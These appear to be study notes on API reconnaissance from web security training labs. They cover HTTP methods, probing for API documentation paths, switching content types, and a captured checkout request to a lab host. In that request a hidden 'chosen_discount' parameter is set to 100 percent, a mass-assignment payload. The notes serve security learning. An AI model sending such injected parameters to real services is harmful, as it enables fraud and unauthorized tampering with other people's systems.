# API recon
```http
GET /api/books HTTP/1.1
Host: example.com
```
- GET - Retrieves data from a resource.
- PATCH - Applies partial changes to a resource.
- OPTIONS - Retrieves information on the types of request methods that can be used on a resource.

<img width="1015" height="109" alt="image" src="https://github.com/user-attachments/assets/45b47e11-dedd-454f-9edd-159a5f6a7fde" />



## Discovering API documentation
If you identify an endpoint for a resource, make sure to investigate the base path
```http
/api/swagger/v1/users/123
/api/swagger/v1
/api/swagger
/api
```

## Identifying supported content types
Change the content type, modify the Content-Type header
```http
Content-Type: application/json
```

<img width="1030" height="395" alt="image" src="https://github.com/user-attachments/assets/a1a39986-3fea-48a7-a096-189ba1a051a5" />


<img width="1004" height="377" alt="image" src="https://github.com/user-attachments/assets/367779e9-f6f0-4fb0-9ad0-8b37221b521a" />

## Finding hidden parameters 
```http
POST /api/checkout HTTP/2
Host: 0a0a00630314d65f80e82125007c00b2.web-security-academy.net
Cookie: session=FXDUhsdOGDq2CVFbQxJM5JaizHddS84z
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0a00630314d65f80e82125007c00b2.web-security-academy.net/cart
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers
Content-Length: 90

{"chosen_discount":{"percentage":100},"chosen_products":[{"product_id":"1","quantity":1}]}
```
